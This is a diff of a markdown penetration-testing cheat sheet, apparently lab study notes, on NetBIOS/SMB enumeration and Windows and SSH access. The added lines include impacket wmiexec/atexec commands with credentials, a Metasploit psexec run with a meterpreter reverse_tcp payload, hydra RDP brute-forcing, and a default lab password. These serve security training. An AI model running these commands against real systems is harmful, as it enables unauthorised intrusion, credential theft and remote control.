@@ -1,7 +1,7 @@
 Enumeration & Service
 ===
 
-🔙 [MENU README](../README.md)
+🔙 [MENU README](../README.md#note)
 
 # iLab
 Module 6 
@@ -77,7 +77,16 @@ Detection Windows
 nbtstat -n                # Local Computer Name
 SERVER2019     <00>       # service.msc -> Workstation service
 SERVER2019     <20>       # service.msc -> Server service
-
+# <00> - 一般表示工作站服務名稱
+# <03> - 一般表示信使服務名稱
+# <20> - 一般表示文件服務名稱（Server service）
+#         [NetBIOS name of the computer]
+# <1B> - 一般表示主域控制器名稱（Domain master browser）
+# <1C> - 一般表示域控制器組名
+#        [NetBIOS domain name for the machine]
+# <1E> - 一般表示瀏覽服務選舉名稱
+# <1D> - 一般表示本地主瀏覽器名稱（Local master browser）
+# <1F> - 一般表示 NetDDE 服務名稱
 
 nbtstat -a $ComputerName  # 指定host的NetBIOS資訊
 nbtstat -A $IP            # Remote Host的NetBIOS資訊
@@ -138,6 +147,7 @@ TCP 139,445
 
 nmap -iL -p445 -sVC
 nmap --script smb-os-discovery,smb-protocols
+nmap -n --script smb-os-discovery,smb-protocols $IP
 nmap 192.168.0.* -p445 --open -n -Pn -oG - | grep Up | cut -d ' ' -f2 > ip_smb
 nmap -iL smb_list.txt -n -Pn -p445 -sV --script smb-os-discovery,smb-protocols
 ```
@@ -159,6 +169,9 @@ Access
 # psexec
 psexec.py 'administrator:Pa$$w0rd'@192.168.0.22
 
+# wmiexec
+python3 wmiexec.py administrator:1234567@172.25.3.100
+
 # winexe
 winexe -U 'Username%Password' //<IP> cmd.exe
 winexe -U 'administrator%Pa$$w0rd' //192.168.0.22 cmd.exe
@@ -169,6 +182,18 @@ secretsdump.py 'administrator:Pa$$w0rd'@192.168.0.7
 # pth-winexe 在2016後的機器成功率其實不高
 pth-winexe –U 'Username%<LM_hash:NTLM_hash>' //<IP> cmd.exe
 psexec.py 'administrator'@192.168.0.22 -hashes :$hash
+
+# Meta (msf)
+msconsole -q
+use exploit/windows/smb/psexec
+options
+set rhost 172.0.0.4
+set smbuser administrator
+set smbpass 12345
+set payload windows/meterpreter/reverse_tcp
+exploit
+shell
+search -f file.txt
 ```
 ---
 
@@ -180,6 +205,7 @@ Crack
 ```bash
 # hydra
 hydra rdp://192.168.0.7 -l administrator -p 'Pa$$w0rd'
+hydra rdp://192.168.0.7 -L Username.txt -P Password.txt
 
 # crowbar
 sudo apt install -y crowbar 
@@ -218,6 +244,8 @@ reg
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 ```
 
+---
+
 # SSH
 Metasploit
 ```bash
@@ -238,16 +266,22 @@ hydra -t 4 -l aleksander -P Passwords.txt ssh://192.168.0.70  #dolphin
 hydra -t 4 -l administrator -p 'Infinit3' ssh://192.168.0.70
 ```
 
-# owaspbwa
+---
+
+# Windows Access
+```bash
+impacket-atexec CPNETCPNET.LOCALNET/cpent:Pa\$\$w0rd123@127.0.0.1 "certutil -hashfile C:\\Users\\Administrator\\flag.txt SHA256"
+
+impacket-atexec administrator:1234567@172.25.30.4 "dir C:\\Users\\Administrator\\Documents\\"
+
+python3 wmiexec.py administrator:1234567@172.25.30.55
+```
+
+---
+
+# OWASPBWA 
 ```bash
 # 如果看到題目的靶機是這個平臺的，很常用這組密碼，可以試試看
 # https://code.google.com/archive/p/owaspbwa/wikis/UserGuide.wiki
 Pa$$w0rd123
-```
-
-# Cheatsheet
-```bash
-impacket-atexec CPNETCPNET.LOCALNET/cpent:Pa\$\$w0rd123@127.0.0.1 "certutil -hashfile C:\\Users\\Administrator\\adminflag.txt SHA256"
-
-impacket-atexec administrator:1234567@172.25.30.4 "dir C:\\Users\\Administrator\\Documents\\"
 ```
